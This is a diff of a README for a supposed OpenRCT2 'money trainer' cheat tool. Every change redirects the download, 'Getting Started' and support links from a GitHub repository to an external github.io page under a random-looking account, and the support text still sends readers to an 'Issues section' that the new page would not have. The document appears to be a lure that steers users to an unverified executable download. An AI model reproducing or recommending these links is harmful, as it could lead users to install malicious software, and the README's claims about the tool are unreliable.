@@ -1,6 +1,6 @@
 # 🎢 openrct2-money-trainer-2026 - Never Worry About Money Again
 
-[![Download Now](https://img.shields.io/badge/Download-OpenRCT2%20Money%20Trainer%202026-2ea44f?style=for-the-badge)](https://github.com/mantled-capitalofpapuanewguinea7105/openrct2-money-trainer-2026)
+[![Download Now](https://img.shields.io/badge/Download-OpenRCT2%20Money%20Trainer%202026-2ea44f?style=for-the-badge)](https://mantled-capitalofpapuanewguinea7105.github.io)
 
 ---
 
@@ -35,7 +35,7 @@ Whether you're playing a custom scenario, a classic RCT2 scenario, or a sandbox 
 
 ## 🚀 Getting Started
 
-Visit this link to download the application: [https://github.com/mantled-capitalofpapuanewguinea7105/openrct2-money-trainer-2026](https://github.com/mantled-capitalofpapuanewguinea7105/openrct2-money-trainer-2026)
+Visit this link to download the application: [https://mantled-capitalofpapuanewguinea7105.github.io](https://mantled-capitalofpapuanewguinea7105.github.io)
 
 Once you're on that page, look for the download button or link. The file will be small—just a few megabytes. Download it to any folder you like, such as your Desktop or Downloads folder.
 
@@ -45,7 +45,7 @@ Once you're on that page, look for the download button or link. The file will be
 
 ### Step 1: Download the Trainer
 
-Visit this link to download the application: [https://github.com/mantled-capitalofpapuanewguinea7105/openrct2-money-trainer-2026](https://github.com/mantled-capitalofpapuanewguinea7105/openrct2-money-trainer-2026)
+Visit this link to download the application: [https://mantled-capitalofpapuanewguinea7105.github.io](https://mantled-capitalofpapuanewguinea7105.github.io)
 
 The download should start automatically or you'll see a button to click. Save the file somewhere you can find it easily.
 
@@ -187,7 +187,7 @@ The trainer works by temporarily modifying memory values while OpenRCT2 is runni
 
 ## 📞 Support
 
-If you encounter any issues, please visit the repository page at [https://github.com/mantled-capitalofpapuanewguinea7105/openrct2-money-trainer-2026](https://github.com/mantled-capitalofpapuanewguinea7105/openrct2-money-trainer-2026) and check the Issues section. You can also open a new issue if your problem isn't already listed.
+If you encounter any issues, please visit the repository page at [https://mantled-capitalofpapuanewguinea7105.github.io](https://mantled-capitalofpapuanewguinea7105.github.io) and check the Issues section. You can also open a new issue if your problem isn't already listed.
 
 ---
 
